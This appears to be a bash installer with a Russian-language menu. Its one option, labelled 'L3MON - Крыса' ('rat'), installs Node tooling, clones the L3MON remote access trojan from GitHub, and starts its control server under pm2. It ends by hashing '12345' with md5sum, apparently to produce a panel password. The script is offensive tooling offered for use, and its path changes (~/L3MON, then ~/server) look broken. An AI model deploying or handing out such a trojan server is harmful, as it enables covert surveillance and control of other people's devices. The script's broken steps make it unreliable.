#!/bin/bash
clear
echo "--------------------"
echo "|     Кто ты ?     |"
echo "|------------------|"
echo "| 1. Termux        |"
echo "|  L3MON - Крыса   |"
echo "|                  |"
echo "| Введите: 1       |"
echo "--------------------"
read numb
if [ $numb = "1" ]
then
	apt install nodejs npm
	npm install pm2 -g
	git clone https://github.com/D3VL/L3MON.git
	cd ~/L3MON
	cd ~/server
    npm install
    npm audit fix
    pm2 start index.js
    pm2 startup
    pm2 stop index
    echo -n "12345" | md5sum
fi
